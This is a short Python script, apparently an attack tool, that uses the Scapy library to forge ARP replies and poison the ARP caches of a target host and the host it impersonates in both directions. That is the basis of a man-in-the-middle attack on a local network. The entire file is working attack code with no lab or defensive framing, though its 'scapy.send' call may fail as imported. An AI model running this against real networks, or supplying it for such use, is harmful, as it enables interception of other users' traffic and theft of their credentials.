from scapy.layers.l2 import ARP
import scapy
import macAddress as mac
def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip,
                hwdst = mac.get_mac(target_ip),
                    psrc = spoof_ip)
    scapy.send(packet, verbose=False)
def arpPoison(target_ip, spoof_ip):
    spoof(target_ip, spoof_ip)
    spoof(spoof_ip, target_ip)